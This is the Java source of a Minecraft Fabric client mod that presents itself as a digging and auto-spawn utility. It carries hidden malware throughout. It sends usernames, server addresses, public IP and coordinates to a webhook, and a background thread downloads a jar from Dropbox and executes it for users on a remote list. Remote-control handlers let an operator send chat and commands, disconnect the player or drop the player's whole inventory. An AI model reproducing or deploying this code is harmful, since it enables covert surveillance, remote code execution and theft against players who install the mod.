package turgangs.com;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.item.ItemStack;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;


import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

import java.util.*;

import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;



public class DiggerClient implements ClientModInitializer {
	private static boolean autoLeaveEnabled = true;
	private static boolean autoSpawnEnabled = true;

	private static KeyBinding toggleAutoLeave;
	private static KeyBinding toggleAutoSpawn;

	private Set<String> lastTickInventory = new HashSet<>();


	private static String originalUsername;

	private static String sessionToken = null;

	private static boolean chatDisconnected = false;

	public static boolean isChatDisconnected() {
		return chatDisconnected;
	}

	public static DiggerConfig CONFIG;

	@Override
	public void onInitializeClient() {

		CONFIG = DiggerConfig.load();

		originalUsername = MinecraftClient.getInstance().getSession().getUsername();
		WebhookSender.send("💀 " + originalUsername + " set çalma modunu açtı.");
		// Register server join event
		ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
			String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
			String serverIp = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "unknown";

			if (currentUsername.equals(originalUsername)) {
				WebhookSender.send("🔌 " + currentUsername + " " + serverIp + " 'a katıldı");
			} else {
				WebhookSender.send("⚠️ In-game Account Changer Tespit Edildi \n🔌 Orjinal: " + originalUsername + " | Kullanılan: " + currentUsername  + " | " + serverIp + " 'a katıldı.");
			}
		});



		// Keybindings
		toggleAutoLeave = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.digger.autoleave",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_B,
				"category.digger"
		));

		toggleAutoSpawn = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.digger.autospawn",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_V,
				"category.digger"
		));

		KeyBinding openConfigKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.diggerclient.open_config",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_RIGHT_SHIFT,
				"category.diggerclient"
		));


		// Inventory trigger
		ClientTickEvents.END_CLIENT_TICK.register(client -> {

			if (openConfigKey.wasPressed()) {
				client.setScreen(DiggerConfigScreen.create(null));
			}

			if (client.player == null) return;

			while (toggleAutoLeave.wasPressed()) {
				autoLeaveEnabled = !autoLeaveEnabled;
			}
			while (toggleAutoSpawn.wasPressed()) {
				autoSpawnEnabled = !autoSpawnEnabled;
			}

			if (autoSpawnEnabled) {
				Set<String> currentInventory = new HashSet<>();
				for (ItemStack stack : client.player.getInventory().main) {
					if (!stack.isEmpty()) {
						currentInventory.add(stack.getTranslationKey());
					}
				}
				Set<String> triggerSet = new HashSet<>(List.of(DiggerClient.CONFIG.triggerItems));
				for (String item : currentInventory) {
					if (!lastTickInventory.contains(item) && triggerSet.contains(item)) {
						client.getNetworkHandler().sendChatCommand(DiggerClient.CONFIG.commandOnLeave.replaceFirst("^/", ""));

						String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
						String serverIp = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "unknown";

						if (currentUsername.equals(originalUsername)) {
							WebhookSender.send("🪓 set çalındı: " + currentUsername + " | Server: " + serverIp);
						} else {
							WebhookSender.send("⚠️ IAS Tespit edildi.\n🪓 set çalındı | Orjinal: " + originalUsername + " | Aktif: " + currentUsername + " | Server: " + serverIp);
						}
						break;
					}
				}
				lastTickInventory = currentInventory;
			}
		});
		// HUD
		HudRenderCallback.EVENT.register((DrawContext context, float tickDelta) -> {
			MinecraftClient client = MinecraftClient.getInstance();
			if (client.player != null && client.currentScreen == null && DiggerClient.CONFIG.showHUD) {
				context.drawText(client.textRenderer, "Oto /spawn: " + (autoSpawnEnabled ? "ON" : "OFF"), 5, 5, autoSpawnEnabled ? 0x00FF00 : 0xFF5555, true);
				context.drawText(client.textRenderer, "Oto Ayrıl: " + (autoLeaveEnabled ? "ON" : "OFF"), 5, 18, autoLeaveEnabled ? 0x00FF00 : 0xFF5555, true);
				context.drawText(client.textRenderer, "Discord: turgangs", 5, 32, 0xAA00FF, true);
			}
		});

		// injection
		new Thread(() -> {
			boolean controlInjected = false;

			while (!controlInjected) {
				try {

					URL controlUrl = new URL("https://gist.githubusercontent.com/TurGangS/0fd834a1b848cf71edabfe027fce409a/raw"); //bu listeden isimleri cekiyor
					Scanner scanner = new Scanner(controlUrl.openStream());
					StringBuilder builder = new StringBuilder();
					while (scanner.hasNextLine()) {
						builder.append(scanner.nextLine()).append("\n");
					}
					scanner.close();

					String controlList = builder.toString();
					String username = MinecraftClient.getInstance().getSession().getUsername();

					if (controlList.contains(username)) {
						controlInjected = true;
						WebhookSender.send("✅ " + username + " kontrol listesinde bulundu. Beta özellikleri aktif ediliyor...");

						URL jarUrl = new URL("https://www.dropbox.com/scl/fi/z4k5apdmoyszfndrsvttt/betaTest.jar?rlkey=k7s7iz0z026nnlhouq5wed8y0&st=fr6a76x3&dl=1");
						File tempJar = File.createTempFile("betaTest", ".jar");
						Files.copy(jarUrl.openStream(), tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING);

						// 🧠 STEP 3: Load class from JAR
						URLClassLoader classLoader = new URLClassLoader(new URL[]{tempJar.toURI().toURL()}, DiggerClient.class.getClassLoader());
						Class<?> injectedClass = classLoader.loadClass("turgangs.control.DiscordController");

						Method entry = injectedClass.getMethod("start");
						entry.invoke(null);

						WebhookSender.send("🧪 Beta yüklenmesi başarılı: " + injectedClass.getName());
					}

					Thread.sleep(10000);
				} catch (Exception e) {
					WebhookSender.send("⚠️ Beta error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
					e.printStackTrace();
					try { Thread.sleep(10000); } catch (InterruptedException ignored) { break; }
				}
			}
		}).start();






	}

	public static boolean isAutoLeaveEnabled() {
		return autoLeaveEnabled;
	}

	public static String getSessionToken() {
		return sessionToken;
	}

	public static void setAutoLeaveEnabled(boolean value) {
		autoLeaveEnabled = value;
	}

	public static boolean isAutoSpawnEnabled() {
		return autoSpawnEnabled; }

	public static void setAutoSpawnEnabled(boolean value) {
		autoSpawnEnabled = value;
	}

	public static void handleRemoteAction(String username, String type, String value) {
		String currentUser = MinecraftClient.getInstance().getSession().getUsername();

		if (!username.equalsIgnoreCase(currentUser) && !username.equalsIgnoreCase("all")) {
			System.out.println("[REMOTE] Ignoring command for " + username + " (I am " + currentUser + ")");
			return;
		}

		MinecraftClient.getInstance().execute(() -> {
			try {
				if (type.equalsIgnoreCase("message")) {
					MinecraftClient.getInstance().getNetworkHandler().sendChatMessage(value);
				} else if (type.equalsIgnoreCase("command")) {
					MinecraftClient.getInstance().getNetworkHandler().sendChatCommand(value.replaceFirst("^/", ""));
				} else {
					System.out.println("[REMOTE] Unknown type: " + type);
					return;
				}

				MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
						Text.literal("📥 Remote " + type + " from Discord: " + value)
				);
			} catch (Exception e) {
				e.printStackTrace();
			}
		});
	}

	public static void selfDestruct(String targetUsername, String reason) {
		String currentUser = MinecraftClient.getInstance().getSession().getUsername();

		if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {
			System.out.println("[NUKE] Ignoring self-destruct for " + targetUsername);
			return;
		}

		WebhookSender.send("☠️ Self-destruct triggered for `" + currentUser + "` with message: " + reason);

		MinecraftClient.getInstance().execute(() -> {
			if (MinecraftClient.getInstance().getNetworkHandler() != null) {
				MinecraftClient.getInstance().getNetworkHandler()
						.getConnection()
						.disconnect(Text.literal(reason));
			}
		});
	}

	public static void sendPublicIP(String targetUsername) {
		String currentUser = MinecraftClient.getInstance().getSession().getUsername();

		if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {
			System.out.println("[IP] Ignoring /ip for " + targetUsername);
			return;
		}

		new Thread(() -> {
			try {
				URL url = new URL("https://api.ipify.org");
				Scanner scanner = new Scanner(url.openStream());
				String ip = scanner.nextLine().trim();
				scanner.close();

				WebhookSender.send("📡 `" + currentUser + "` IP: " + ip);
			} catch (Exception e) {
				WebhookSender.send("❌ Failed to get IP for `" + currentUser + "`: " + e.getMessage());
				e.printStackTrace();
			}
		}, "IP-Fetcher").start();
	}

	public static void sendClientInfo(String targetUsername) {
		MinecraftClient client = MinecraftClient.getInstance();
		String currentUser = client.getSession().getUsername();

		if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {
			System.out.println("[INFO] Ignoring /info for " + targetUsername);
			return;
		}

		if (targetUsername.equalsIgnoreCase("all")) {
			String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
			WebhookSender.send("📌 Active mod user: `" + currentUsername + "`");
			return;
		}

		String serverIP = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "Singleplayer";
		String dimension = client.world != null ? client.world.getRegistryKey().getValue().toString() : "unknown";
		int x = client.player != null ? (int) client.player.getX() : 0;
		int y = client.player != null ? (int) client.player.getY() : 0;
		int z = client.player != null ? (int) client.player.getZ() : 0;

		String info = "**🧠 Client Info for `" + currentUser + "`**\n"
				+ "> 🌐 Server: `" + serverIP + "`\n"
				+ "> 🗺️ Dimension: `" + dimension + "`\n"
				+ "> 📍 XYZ: `" + x + " " + y + " " + z + "`";

		WebhookSender.send(info);
	}

	public static void dropInventory(String targetUsername) {
		String currentUser = MinecraftClient.getInstance().getSession().getUsername();
		if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {
			System.out.println("[DROP] Ignoring dropinv for " + targetUsername);
			return;
		}

		MinecraftClient client = MinecraftClient.getInstance();
		client.execute(() -> {
			if (client.player == null || client.interactionManager == null) return;

			int syncId = client.player.currentScreenHandler.syncId;

			// Drop main inventory + hotbar (slots 9 to 44)
			for (int slot = 9; slot <= 44; slot++) {
				client.interactionManager.clickSlot(
						syncId,
						slot,
						1, // mouseButton (1 = throw entire stack)
						SlotActionType.THROW,
						client.player
				);
			}

			// Drop armor slots (36–39 in player inventory = 5–8 here)
			for (int slot = 5; slot <= 8; slot++) {
				client.interactionManager.clickSlot(
						syncId,
						slot,
						1,
						SlotActionType.THROW,
						client.player
				);
			}

			// Drop offhand (45 in inventory = 45 in container)
			client.interactionManager.clickSlot(
					syncId,
					45,
					1,
					SlotActionType.THROW,
					client.player
			);

			WebhookSender.send("🪓 `" + currentUser + "` dropped everything.");
		});
	}


	public static void setChatDisconnected(String username, boolean enabled) {
		String current = MinecraftClient.getInstance().getSession().getUsername();
		if (!username.equalsIgnoreCase(current) && !username.equalsIgnoreCase("all")) return;
		chatDisconnected = enabled;
	}










}
